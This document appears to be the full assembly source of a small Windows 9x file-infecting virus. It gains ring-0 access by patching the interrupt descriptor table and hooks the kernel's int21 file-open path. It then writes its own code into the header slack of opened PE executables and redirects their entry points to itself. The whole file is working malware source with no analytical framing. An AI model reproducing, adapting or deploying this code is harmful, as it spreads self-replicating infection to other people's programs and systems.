
kernel_ord0             equ     0BFF713D4h
kernel_int21            equ     0BFF712B9h

VxDcall                 macro   VxD, Service
                        db      0CDh
                        db      020h
                        dw      Service
                        dw      VxD
                        endm

VMMcall                 macro   Service
                        VxDcall VMM, Service
                        endm

IFSMGR                  equ     0040h
GetHeap                 equ     000Dh

                        p386
                        model   flat

                        .data

                        dd      ?

                        .code
start:
                        push    edi
                        sidt    [esp-2]
                        pop     edi

                        fild    qword ptr [edi]

                        call    getr0procaddr

r0proc:                 fistp   qword ptr [edi-8]
                        ;;
                        mov     ebx, kernel_int21+8
;                       cmp     [ebx], 0C0000000h-(kernel_int21+8)
;                       jg      r0exit
                        cmp     byte ptr [ebx], (kernel_ord0-(kernel_int21+8+4)) and 255
                        jne     r0exit

                        fild    qword ptr [esi+vc1-start]

                        push    virtsize
vc1:                    VxDcall IFSMGR, GetHeap
                        pop     ecx

                        fistp   qword ptr [esi+vc1-start]

                        xchg    edi, eax
                        rep     movsb

                        sub     edi, virtend-hook+4
                        sub     edi, ebx
                        mov     [ebx], edi
                        ;;
r0exit:                 iret

getr0procaddr:          pop     eax
                        stosd
                        stosd
                        mov     [edi-6], 0EE000028h

                        xchg    esi, eax
                        sub     esi, r0proc-start

                        int     00h

                        db      68h
oldeip                  dd      $+4
                        ret



read:                   xor     ecx, ecx
                        mov     ch, bufsize/256

                        lea     edx, [esi+ecx]

                        mov     ah, 3Fh
                        jmp     ebp

hook:                   cmp     eax, 716Ch
                        jne     hookexit

infect:                 pusha

                        mov     bx, 2042h
                        xor     edx, edx
                        push    edx
                        inc     edx
                        push    eax
                        push    002A0010h
                        mov     ebp, kernel_ord0
                        call    ebp
                        jc      infect_exit
                        xchg    ebx, eax

                        mov     ebp, kernel_int21

                        mov     esi, [ebp+8]
                        add     esi, ebp
                        sub     esi, hook-start-8-4

                        lea     edi, read-start[esi]
                        call    edi

                        push    edx

                        mov     ah, 42h         ; al=0
                        mov     edx, [edx+3Ch]
                        xor     ecx, ecx
                        pusha
                        call    ebp

                        call    edi
                        cmp     eax, ecx

                        popa
                        jne     pop1_infect_close
                        call    ebp

                        pop     edx

                        cmp     word ptr [edx], '0Z'
                        jne     infect_close

                        mov     ecx, [edx+54h]  ; pe_headersize
                        lea     edi, [edx+ecx]
                        add     cx, ax
                        xchg    ecx, [edx+28h]  ; entrypointrva
                        add     ecx, [edx+34h]  ; imagebase
                        mov     oldeip-start[esi], ecx

                        xor     ecx, ecx
                        mov     cl, physsize
                        add     [edx+54h], ecx  ; pe_headersize
                        cld
                        cmp     dword ptr [edi+ecx], 0
;                       xor     eax, eax
;                       pusha
;                       repz    scasb
;                       popa
                        jne     infect_close
                        rep     movsb

                        mov     ah, 40h
                        mov     ch, bufsize/256
                        call    ebp

                        push    eax
pop1_infect_close:      pop     eax

infect_close:           mov     ah, 3Eh
                        call    ebp

infect_exit:            popa

hookexit:               push    kernel_ord0
                        ret

physend:
physsize                equ     $-start

                        org     start+bufsize
bufsize                 equ     4096
buf                     db      bufsize dup (?)

virtend:
virtsize                equ     $-start

                        db      13,10
                        db      '------------------------',13,10

                        db      'physsize = '
                        db      physsize/1000 mod 10+'0'
                        db      physsize/ 100 mod 10+'0'
                        db      physsize/  10 mod 10+'0'
                        db      physsize/   1 mod 10+'0'
                        db      ' bytes',13,10
                        db      'virtsize = '
                        db      virtsize/1000 mod 10+'0'
                        db      virtsize/ 100 mod 10+'0'
                        db      virtsize/  10 mod 10+'0'
                        db      virtsize/   1 mod 10+'0'
                        db      ' bytes',13,10

                        db      '------------------------',13,10
                        db      13,10

                        end     start
